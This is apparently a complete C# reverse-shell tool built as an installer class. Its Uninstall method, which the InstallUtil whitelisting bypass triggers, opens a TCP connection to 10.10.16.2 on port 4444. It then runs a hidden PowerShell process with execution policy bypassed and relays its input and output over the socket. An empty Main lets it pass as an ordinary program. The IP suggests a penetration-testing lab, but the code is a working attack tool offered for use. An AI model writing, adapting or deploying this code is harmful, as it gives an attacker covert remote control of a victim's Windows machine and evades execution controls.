using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;


[System.ComponentModel.RunInstaller(true)]
public class Program : System.Configuration.Install.Installer
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(uint lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr param,
        uint dwCreationFlags, ref uint lpThreadId);

    [DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle,
        uint dwMilliseconds);

    private static StreamWriter
        sw; // Needs to be global so that HandleDataReceived() can access it

    public override void Uninstall(
        System.Collections.IDictionary savedState)
    {
        RPwSh();
    }

    private static void RPwSh()
    {
        // Check for correct number of arguments
        //if (args.Length != 2)
        //{
        //    Console.WriteLine($"Usage: {Process.GetCurrentProcess().ProcessName} <IP> <Port>");
        //    return;
        //}

        try
        {
            // Connect to <IP> on <Port>/TCP
            var client = new TcpClient();
            //client.Connect(args[0], int.Parse(args[1]));
            client.Connect("10.10.16.2", 4444);

            // Set up input/output streams
            Stream stream = client.GetStream();
            var sr = new StreamReader(stream);
            sw = new StreamWriter(stream);
            sw.WriteLine("Hello");
            sw.Flush();

            // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
            var p = new Process();
            p.StartInfo.FileName =
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            p.StartInfo.Arguments = "-ep bypass -nologo";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.OutputDataReceived +=
                new DataReceivedEventHandler(HandleDataReceived);
            p.ErrorDataReceived +=
                new DataReceivedEventHandler(HandleDataReceived);

            // Start process and begin reading output
            p.Start();
            p.BeginOutputReadLine();
            p.BeginErrorReadLine();

            // Re-route user-input to STDIN of the PowerShell process
            // If we see the user sent "exit", we can stop
            var userInput = "";
            while (!userInput.Equals("exit"))
            {
                userInput = sr.ReadLine();
                p.StandardInput.WriteLine(userInput);
            }

            // Wait for PowerShell to exit (based on user-inputted exit), and close the process
            p.WaitForExit();
            client.Close();
        }
        catch (Exception)
        {
        }
    }

    private static void HandleDataReceived(object sender,
        DataReceivedEventArgs e)
    {
        if (e.Data != null)
        {
            sw.WriteLine(e.Data);
            sw.Flush();
        }
    }
}

public class dummy
{
    public static void Main(string[] args)
    {
    }
}